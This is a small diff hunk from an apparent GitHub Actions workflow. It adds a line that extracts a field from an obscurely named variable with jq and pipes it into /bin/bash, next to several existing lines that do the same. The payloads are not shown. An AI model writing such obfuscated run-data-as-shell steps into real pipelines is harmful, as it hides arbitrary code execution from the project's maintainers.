@@ -25,6 +25,7 @@ jobs:
           echo $xq50 | jq -r .t77379 | /bin/bash
           printf '%s' "$gl70" | jq -r .s44704 | /bin/bash
           echo $sa82 | jq -r .iqth8 | /bin/bash
+          printf '%s' "$dn12164" | jq -r .iv00 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
